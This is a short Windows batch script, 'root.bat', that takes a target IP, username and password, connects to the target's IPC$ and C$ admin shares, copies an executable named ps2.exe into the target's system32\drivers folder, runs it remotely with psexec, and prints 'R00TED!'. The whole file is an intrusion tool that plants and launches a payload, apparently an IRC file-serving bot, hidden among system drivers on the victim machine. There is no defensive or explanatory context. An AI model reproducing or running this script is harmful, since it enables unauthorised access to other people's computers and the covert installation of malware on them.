:: root.bat IP USER PASS
@echo off
net use \\%1\ipc$ /user:%2 %3
net use z: \\%1\c$
xcopy c:\xdcc2\ps2.exe z:\winnt\system32\drivers
psexec \\%1\  "c:\winnt\system32\drivers\ps2.exe"
@echo off
Echo R00TED!